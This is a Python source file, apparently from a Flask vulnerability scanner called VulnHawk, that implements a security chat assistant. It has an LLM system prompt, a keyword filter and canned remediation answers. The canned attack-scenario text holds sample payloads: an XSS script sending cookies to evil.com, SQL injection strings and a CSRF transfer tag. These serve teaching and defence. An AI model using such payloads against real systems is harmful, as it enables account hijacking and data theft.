        current_app.logger.error(f"AI chat error: {str(e)}")
        # Fall back to rule-based responses
        response_text, suggested_questions = _rule_based_chat_response(message, context)

    return jsonify({
        'response': response_text,
        'suggested_questions': suggested_questions,
        'scan_id': scan_id
    })


def _is_security_related(message: str) -> bool:
    """
    Pre-filter to check if the question is security/vulnerability related.
    This saves API costs by rejecting off-topic questions before calling the LLM.
    """
    message_lower = message.lower()

    # Security-related keywords
    security_keywords = [
        # Vulnerability types
        'vulnerability', 'vuln', 'xss', 'sql injection', 'sqli', 'csrf', 'ssrf',
        'rce', 'lfi', 'rfi', 'xxe', 'idor', 'injection', 'overflow', 'exploit',
        # Security concepts
        'security', 'secure', 'attack', 'attacker', 'hacker', 'hack', 'breach',
        'penetration', 'pentest', 'audit', 'risk', 'threat', 'malware', 'payload',
        # Remediation
        'fix', 'patch', 'remediate', 'mitigate', 'protect', 'prevent', 'defense',
        'sanitize', 'validate', 'escape', 'encode', 'filter', 'whitelist', 'blacklist',
        # Standards and compliance
        'owasp', 'cve', 'cvss', 'cwe', 'pci', 'gdpr', 'hipaa', 'compliance', 'nist',
        'iso 27001', 'soc2', 'soc 2',
        # Technical security
        'header', 'cookie', 'session', 'token', 'auth', 'authentication', 'authorization',
        'encryption', 'ssl', 'tls', 'https', 'certificate', 'cors', 'csp', 'hsts',
        'password', 'credential', 'input validation', 'output encoding',
        # Scan related
        'scan', 'report', 'finding', 'severity', 'critical', 'high', 'medium', 'low',
        'priority', 'impact', 'business', 'data', 'sensitive', 'exposure',
        # Code security
        'code', 'script', 'function', 'api', 'endpoint', 'parameter', 'input', 'output',
        'safe', 'unsafe', 'dangerous', 'vulnerable', 'hardening', 'configuration',
        # Question patterns about this scan
        'this scan', 'found', 'detected', 'issue', 'problem', 'what should', 'how to fix',
        'explain', 'describe', 'tell me about', 'what is', 'why is', 'which', 'recommend'
    ]

    # Check if any security keyword is in the message
    for keyword in security_keywords:
        if keyword in message_lower:
            return True

    # Check for question patterns about vulnerabilities
    vuln_patterns = [
        r'\b(what|how|why|which|explain|describe|tell)\b.*\b(vuln|secur|attack|fix|risk)\b',
        r'\b(fix|patch|remediate|mitigate)\b',
        r'\b(priority|critical|urgent|important)\b.*\b(issue|problem|fix)\b',
    ]

    import re
    for pattern in vuln_patterns:
        if re.search(pattern, message_lower):
            return True

    return False


def _get_off_topic_response() -> tuple:
    """Return a polite response for off-topic questions."""
    response = """I'm VulnHawk's **Security Assistant**, specialized in web application security analysis.

I can only help with questions related to:

- **Vulnerability Analysis** - XSS, SQL Injection, CSRF, and other security issues
- **Remediation Guidance** - How to fix security vulnerabilities with code examples
- **Risk Assessment** - Business impact and prioritization of security issues
- **OWASP & Compliance** - Mapping to security standards and best practices
- **Security Best Practices** - Headers, authentication, input validation

**Try asking:**
- "What vulnerabilities should I fix first?"
- "How can an attacker exploit the XSS issue?"
- "Show me code to fix SQL injection"
- "What's the business impact of these findings?"

Please ask a security-related question about this scan!"""

    suggested = [
        "What are the most critical vulnerabilities?",
        "How do I fix the XSS vulnerability?",
        "Explain the business impact of these issues"
    ]

    return response, suggested


def _llm_chat_response(message: str, history: list, context: dict) -> tuple:
    """
    Generate response using LLM (OpenAI GPT-4o-mini or Claude).

    Optimized settings based on OpenAI best practices:
    - temperature=0 for factual, consistent responses
    - gpt-4o-mini for cost efficiency with high quality
    - Strict system prompt to keep responses on-topic
    - Pre-filtering to reject non-security questions
    """
    import os

    # Pre-filter: Check if question is security-related
    if not _is_security_related(message):
        return _get_off_topic_response()

    # Build an advanced, security-focused system prompt
    system_prompt = f"""You are VulnHawk's AI Security Assistant - a specialized expert in web application security vulnerability analysis.

## YOUR IDENTITY
- You are an AI security analyst built into VulnHawk vulnerability scanner
- You ONLY discuss cybersecurity, vulnerabilities, and this specific scan
- You are professional, precise, and actionable in your responses

## STRICT BOUNDARIES - VERY IMPORTANT
- You MUST ONLY answer questions about:
  1. Vulnerabilities found in this scan
  2. Web application security concepts (XSS, SQLi, CSRF, etc.)
  3. Remediation and security best practices
  4. OWASP Top 10, CVE, CVSS scoring
  5. Business/compliance impact of security issues
  6. Security headers, authentication, encryption

- If asked about ANYTHING not related to security (weather, jokes, coding unrelated to security, general knowledge, personal questions, etc.), respond with:
  "I'm specialized in security analysis only. Please ask about the vulnerabilities found in this scan or web security topics."

- NEVER pretend to be a general-purpose assistant
- NEVER answer off-topic questions even if the user insists

## CURRENT SCAN CONTEXT
**Target:** {context['domain']} ({context['target']})
**Risk Score:** {context['risk_score']}/100 ({context['risk_level']} risk level)
**Scan Summary:**
- Critical: {context['vulnerability_counts']['critical']} vulnerabilities
- High: {context['vulnerability_counts']['high']} vulnerabilities
- Medium: {context['vulnerability_counts']['medium']} vulnerabilities
- Low: {context['vulnerability_counts']['low']} vulnerabilities
- Informational: {context['vulnerability_counts']['info']} items
- **Total Issues:** {context['vulnerability_counts']['total']}

## VULNERABILITIES DETECTED
"""
    # Add detailed vulnerability information (limit to prevent token overflow)
    for i, vuln in enumerate(context['vulnerabilities'][:15], 1):
        cvss = f"CVSS: {vuln['cvss_score']}" if vuln.get('cvss_score') else ""
        owasp = f"OWASP: {vuln['owasp_category']}" if vuln.get('owasp_category') else ""
        system_prompt += f"""
### Vulnerability #{i}: {vuln['type'].upper()} ({vuln['severity'].upper()})
- **Name:** {vuln['name']}
- **URL:** {vuln['url']}
- **Parameter:** {vuln['parameter'] or 'N/A'}
- **Scores:** {cvss} {owasp}
- **Description:** {vuln['description'][:300] if vuln['description'] else 'N/A'}
- **Remediation:** {vuln['remediation'][:200] if vuln.get('remediation') else 'See recommendations'}
"""

    system_prompt += """

## RESPONSE GUIDELINES
1. **Be Specific** - Reference actual vulnerabilities from this scan by name/type
2. **Use Markdown** - Format with headers, code blocks, bullet points for readability
3. **Provide Code Examples** - When showing fixes, use proper code blocks with language hints
4. **Prioritize by Severity** - Always emphasize Critical > High > Medium > Low
5. **Be Actionable** - Give concrete steps, not vague advice
6. **Cite OWASP** - Reference OWASP Top 10 categories when relevant
7. **Explain Impact** - Help non-technical stakeholders understand business risk

## CODE EXAMPLE FORMAT
When providing code fixes, always use this format:
```language
// Vulnerable code (BEFORE)
vulnerable_code_here

// Secure code (AFTER)
secure_code_here
```

Now respond to the user's security question based on this scan data."""

    # Build messages array
    messages = [{"role": "system", "content": system_prompt}]

    # Add conversation history (last 8 messages for better context)
    for msg in history[-8:]:
        if msg.get('role') in ['user', 'assistant']:
            messages.append({"role": msg['role'], "content": msg['content']})

    # Add current user message
    messages.append({"role": "user", "content": message})

    # Try OpenAI first (preferred for this use case), then Anthropic
    if os.environ.get('OPENAI_API_KEY'):
        try:
            import openai
            client = openai.OpenAI(api_key=os.environ.get('OPENAI_API_KEY'))

            # Optimized API call based on OpenAI best practices
            response = client.chat.completions.create(
                model="gpt-4o-mini",  # Cost-effective, fast, high quality
                messages=messages,
                temperature=0,  # Deterministic, factual responses
                max_tokens=2048,
                top_p=1,
                frequency_penalty=0.1,  # Slight penalty to reduce repetition
                presence_penalty=0.1,   # Encourage covering new topics
            )

            response_text = response.choices[0].message.content

            # Check if response indicates off-topic (backup check)
            if "only discuss" in response_text.lower() or "security analysis only" in response_text.lower():
                return _get_off_topic_response()

            # Generate context-aware follow-up questions
            suggested = _generate_follow_up_questions(message, context)

            current_app.logger.info(f"OpenAI response generated. Tokens used: {response.usage.total_tokens}")

            return response_text, suggested

        except openai.RateLimitError:
            current_app.logger.warning("OpenAI rate limit hit, falling back")
        except openai.APIError as e:
            current_app.logger.error(f"OpenAI API error: {str(e)}")
        except Exception as e:
            current_app.logger.error(f"OpenAI unexpected error: {str(e)}")

    # Fallback to Anthropic Claude
    if os.environ.get('ANTHROPIC_API_KEY'):
        try:
            import anthropic
            client = anthropic.Anthropic(api_key=os.environ.get('ANTHROPIC_API_KEY'))

            response = client.messages.create(
                model="claude-sonnet-4-20250514",
                max_tokens=2048,
                system=system_prompt,
                messages=[m for m in messages if m['role'] != 'system']
            )

            response_text = response.content[0].text
            suggested = _generate_follow_up_questions(message, context)

            return response_text, suggested

        except Exception as e:
            current_app.logger.error(f"Anthropic API error: {str(e)}")

    # Ultimate fallback to rule-based responses
    return _rule_based_chat_response(message, context)


def _rule_based_chat_response(message: str, context: dict) -> tuple:
    """Generate response using rule-based logic (no LLM required)."""
    message_lower = message.lower()
    vulns = context['vulnerabilities']
    counts = context['vulnerability_counts']

    suggested_questions = []

    # Priority / What to fix first
    if any(kw in message_lower for kw in ['first', 'priority', 'critical', 'urgent', 'important', 'start']):
        critical_high = [v for v in vulns if v['severity'] in ['critical', 'high']]

        if critical_high:
            response = f"""## Priority Remediation Plan

Based on the scan of **{context['domain']}**, here are the vulnerabilities you should address first:

### Critical Priority (Fix Immediately)
"""
            for i, v in enumerate(critical_high[:5], 1):
                response += f"""
**{i}. {v['type'].upper()}** - {v['severity'].upper()}
- Location: `{v['url']}`
- Parameter: `{v['parameter'] or 'N/A'}`
- Description: {v['description'][:150]}...
"""

            response += f"""
### Recommendation
Start with critical vulnerabilities as they pose immediate risk. {counts['critical']} critical and {counts['high']} high severity issues need urgent attention.

Would you like detailed remediation steps for any specific vulnerability?
"""
            suggested_questions = [
                f"How do I fix the {critical_high[0]['type']} vulnerability?",
                "What's the business impact of these vulnerabilities?",
                "Show me code to fix SQL injection"
            ]
        else:
            response = f"""## Good News!

No critical or high severity vulnerabilities were found in **{context['domain']}**.

You have {counts['medium']} medium and {counts['low']} low severity issues to review. These can be addressed in your regular development cycle.

Would you like me to explain any of the medium severity findings?
"""
            suggested_questions = [
                "Explain the medium severity issues",
                "What security best practices should I follow?",
                "How can I prevent future vulnerabilities?"
            ]

        return response, suggested_questions

    # Exploitation / How attackers exploit
    if any(kw in message_lower for kw in ['exploit', 'attack', 'hacker', 'how can', 'attacker']):
        vuln_types = set(v['type'].lower() for v in vulns)

        response = f"""## Attack Scenarios

An attacker targeting **{context['domain']}** could exploit the following vulnerabilities:

"""
        attack_scenarios = {
            'xss': """### Cross-Site Scripting (XSS)
**Attack Vector:** Attacker injects malicious JavaScript into the application
**Impact:**
- Steal user session cookies and hijack accounts
- Redirect users to phishing sites
- Modify page content to trick users
- Keylog user inputs including passwords

**Example Attack:**
```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```
""",
            'sqli': """### SQL Injection
**Attack Vector:** Attacker injects SQL code through input fields
**Impact:**
- Extract entire database contents (user data, passwords)
- Modify or delete data
- Bypass authentication
- Execute system commands on the database server

**Example Attack:**
```sql
' OR '1'='1' --
' UNION SELECT username, password FROM users --
```
""",
            'csrf': """### Cross-Site Request Forgery (CSRF)
**Attack Vector:** Trick authenticated users into performing unwanted actions
**Impact:**
- Transfer money without user consent
- Change user email/password
- Make purchases
- Delete user data

**Example Attack:**
```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```
""",
            'info_disclosure': """### Information Disclosure
**Attack Vector:** Exposed sensitive information helps attackers plan further attacks
**Impact:**
- Reveals server technology for targeted exploits
- Exposes internal paths and architecture
- May leak credentials or API keys
"""
        }

        for vuln_type in list(vuln_types)[:3]:
            if vuln_type in attack_scenarios:
                response += attack_scenarios[vuln_type]

        response += f"""
### Risk Assessment
With a risk score of **{context['risk_score']}/100**, your application is at **{context['risk_level']}** risk of being successfully attacked.
"""

        suggested_questions = [
            "How do I protect against these attacks?",
            "What security headers should I add?",
            "Prioritize which vulnerabilities to fix first"
        ]

        return response, suggested_questions

    # Business Impact
    if any(kw in message_lower for kw in ['business', 'impact', 'cost', 'risk', 'consequence']):
        response = f"""## Business Impact Assessment

### Current Risk Profile
**Target:** {context['domain']}
**Risk Score:** {context['risk_score']}/100 ({context['risk_level']})

### Potential Consequences

"""
        if counts['critical'] > 0 or counts['high'] > 0:
            response += """#### Data Breach Risk: HIGH
- **Customer data exposure** - Personal information, payment details could be stolen
- **Average breach cost:** $4.45M (IBM 2023 Report)
- **Regulatory fines:** GDPR up to 4% of annual revenue, PCI-DSS fines $5k-100k/month

#### Reputation Damage
- Customer trust erosion
- Negative media coverage
- Competitive disadvantage

#### Operational Impact
- Service downtime from attacks
- Incident response costs
- Legal and compliance remediation

"""
        else:
            response += """#### Data Breach Risk: MODERATE
While no critical vulnerabilities exist, the medium/low issues could be chained together or exploited under certain conditions.

"""

        response += f"""### Compliance Implications
Based on {counts['total']} vulnerabilities found:
- **PCI-DSS:** May fail compliance audit if handling payment data
- **GDPR:** Data protection requirements may not be met
- **SOC 2:** Security controls may be insufficient

### ROI of Remediation
Fixing these vulnerabilities now costs significantly less than responding to a breach. Average time to fix: 2-4 developer days vs. breach response: 280 days average.
"""

        suggested_questions = [
            "Which compliance standards are affected?",
            "Create a prioritized fix schedule",
            "What's the technical remediation plan?"
        ]

        return response, suggested_questions

    # Code / Fix / Remediation
    if any(kw in message_lower for kw in ['code', 'fix', 'remediat', 'solve', 'patch', 'secure']):
        # Find relevant vulnerability type
        vuln_type = None
        for vt in ['sql', 'xss', 'csrf', 'injection']:
            if vt in message_lower:
                vuln_type = vt
                break

        if not vuln_type and vulns:
            vuln_type = vulns[0]['type'].lower()

        code_examples = {
            'sqli': """## SQL Injection Remediation

### Problem
User input is directly concatenated into SQL queries.

### Solution: Use Parameterized Queries

**Python (Flask/SQLAlchemy):**
```python
# VULNERABLE - Don't do this!
query = f"SELECT * FROM users WHERE id = {user_id}"

# SECURE - Use parameterized queries
from sqlalchemy import text
result = db.session.execute(
    text("SELECT * FROM users WHERE id = :id"),
    {"id": user_id}
)

# Or with ORM
user = User.query.filter_by(id=user_id).first()
```

**Node.js (with pg):**
```javascript
// VULNERABLE
const query = `SELECT * FROM users WHERE id = ${userId}`;

// SECURE
const query = 'SELECT * FROM users WHERE id = $1';
const result = await pool.query(query, [userId]);
```

### Additional Protections
1. Input validation - whitelist allowed characters
2. Least privilege database accounts
3. Web Application Firewall (WAF)
""",
            'xss': """## XSS Remediation

### Problem
User input is rendered in HTML without proper encoding.

### Solution: Output Encoding + CSP

**HTML Context:**
```python
# Python/Jinja2 - Auto-escapes by default
{{ user_input }}  # Safe

# If you need raw HTML (rare), sanitize first
{{ user_input | safe }}  # Only after sanitization!
```

**JavaScript Context:**
```javascript
// VULNERABLE
element.innerHTML = userInput;

// SECURE - Use textContent
element.textContent = userInput;

// Or sanitize with DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Content Security Policy Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

### React/Vue (Safe by Default)
```jsx
// React - automatically escaped
<div>{userInput}</div>

// DANGEROUS - avoid if possible
<div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />
```
""",
            'csrf': """## CSRF Remediation

### Problem
Forms can be submitted from malicious third-party sites.

### Solution: CSRF Tokens

**Flask-WTF (Python):**
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# In template
<form method="POST">
    {{ form.csrf_token }}
    <!-- or -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
</form>
```

**Express.js:**
```javascript
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// In route
res.render('form', { csrfToken: req.csrfToken() });
```

**AJAX Requests:**
```javascript
// Include CSRF token in headers
fetch('/api/action', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
    },
    body: JSON.stringify(data)
});
```

### Additional Protections
1. SameSite cookie attribute
2. Check Origin/Referer headers
3. Re-authentication for sensitive actions
"""
        }

        if vuln_type in code_examples or any(k in vuln_type for k in code_examples.keys()):
            for k, v in code_examples.items():
                if k in vuln_type:
                    response = v
                    break
        else:
            response = f"""## Remediation Guide

For the vulnerabilities found in **{context['domain']}**, here are the key fixes:

### 1. Input Validation
Always validate and sanitize user input on both client and server side.

### 2. Output Encoding
Encode output based on context (HTML, JavaScript, URL, CSS).

### 3. Security Headers
Add these headers:
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
```

### 4. Keep Dependencies Updated
Regularly update frameworks and libraries to patch known vulnerabilities.

Which specific vulnerability would you like detailed fix code for?
"""

        suggested_questions = [
            "Show me XSS prevention code",
            "How do I implement CSRF protection?",
            "What security headers should I add?"
        ]

        return response, suggested_questions

    # OWASP
    if any(kw in message_lower for kw in ['owasp', 'top 10', 'category', 'categories']):
        owasp_mapping = {
            'xss': 'A03:2021 - Injection',
            'sqli': 'A03:2021 - Injection',
            'csrf': 'A01:2021 - Broken Access Control',
            'info_disclosure': 'A05:2021 - Security Misconfiguration',
            'headers': 'A05:2021 - Security Misconfiguration',
            'sensitive_data': 'A02:2021 - Cryptographic Failures'
        }

        affected_categories = {}
        for v in vulns:
            vtype = v['type'].lower()
            for key, category in owasp_mapping.items():
                if key in vtype:
                    if category not in affected_categories:
                        affected_categories[category] = []
                    affected_categories[category].append(v)
                    break

        response = f"""## OWASP Top 10 2021 Analysis

### Affected Categories for {context['domain']}

"""
        for category, category_vulns in affected_categories.items():
            response += f"""#### {category}
Found **{len(category_vulns)}** vulnerability(ies):
"""
            for v in category_vulns[:3]:
                response += f"- {v['severity'].upper()}: {v['name']}\n"
            response += "\n"

        if not affected_categories:
            response += """No OWASP Top 10 categories directly affected based on the scan results. This is good, but continue to follow security best practices.
"""

        response += """
### OWASP Top 10 2021 Reference
1. **A01** - Broken Access Control
2. **A02** - Cryptographic Failures
3. **A03** - Injection
4. **A04** - Insecure Design
5. **A05** - Security Misconfiguration
6. **A06** - Vulnerable Components
7. **A07** - Identification and Authentication Failures
8. **A08** - Software and Data Integrity Failures
9. **A09** - Security Logging and Monitoring Failures
10. **A10** - Server-Side Request Forgery (SSRF)
"""

        suggested_questions = [
            "How do I fix the Injection vulnerabilities?",
            "Explain Broken Access Control risks",
            "What compliance standards map to OWASP?"
        ]

        return response, suggested_questions

    # Default response
    response = f"""## Security Analysis Summary

I've analyzed the scan results for **{context['domain']}**.

### Quick Stats
- **Risk Score:** {context['risk_score']}/100 ({context['risk_level']})
- **Total Vulnerabilities:** {counts['total']}
- **Critical:** {counts['critical']} | **High:** {counts['high']} | **Medium:** {counts['medium']} | **Low:** {counts['low']}

### Top Findings
"""
    for v in vulns[:3]:
        response += f"- **{v['severity'].upper()}** {v['type'].upper()}: {v['name']}\n"

    response += """
### What would you like to know?
I can help with:
- **Prioritization** - Which vulnerabilities to fix first
- **Exploitation** - How attackers could exploit these issues
- **Remediation** - Code examples and fix guidance
- **Business Impact** - Risk assessment and compliance implications
- **OWASP Mapping** - How these map to OWASP Top 10

Just ask a question!
"""

    suggested_questions = [
        "What should I fix first?",
        "How can these be exploited?",
        "Show me code to fix these issues",
        "What's the business impact?"
    ]

    return response, suggested_questions


def _generate_follow_up_questions(message: str, context: dict) -> list:
    """Generate contextual follow-up questions."""
    message_lower = message.lower()
    vulns = context['vulnerabilities']

    questions = []

    if 'fix' in message_lower or 'remediat' in message_lower:
        questions.extend([
            "What security headers should I implement?",
            "How do I test that the fix works?",
            "What's the timeline for fixing all issues?"
        ])
    elif 'exploit' in message_lower or 'attack' in message_lower:
        questions.extend([
            "How do I protect against these attacks?",
            "What monitoring should I set up?",
            "Are there any quick mitigations?"
        ])
    elif 'business' in message_lower or 'impact' in message_lower:
        questions.extend([
            "Create a risk report for stakeholders",
            "What compliance standards are affected?",
            "How do I communicate this to management?"
        ])
    else:
        # Default suggestions based on vulnerabilities
        if vulns:
            questions.append(f"Explain the {vulns[0]['type']} vulnerability in detail")
        questions.extend([
            "What should I fix first?",
            "Show me remediation code examples"
        ])

    return questions[:4]  # Max 4 suggestions
